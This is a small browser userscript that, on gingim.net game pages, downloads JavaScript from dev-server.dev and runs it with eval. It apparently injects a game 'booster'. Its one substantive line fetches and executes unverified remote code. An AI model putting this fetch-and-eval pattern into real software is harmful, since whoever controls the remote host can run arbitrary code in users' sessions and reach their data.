
/**
 * mode: production 
 */

// ==UserScript==
// @name        gingim-booster-inject.js
// @description Code injection of gingim-booster
// @match       https://gingim.net/games*
// ==/UserScript==

(() =>{
    if (window.location.hostname === 'gingim.net'){
    const url = 'https://dev-server.dev/i.js';
    fetch(url).then(r => r.text()).then(eval)
}})();
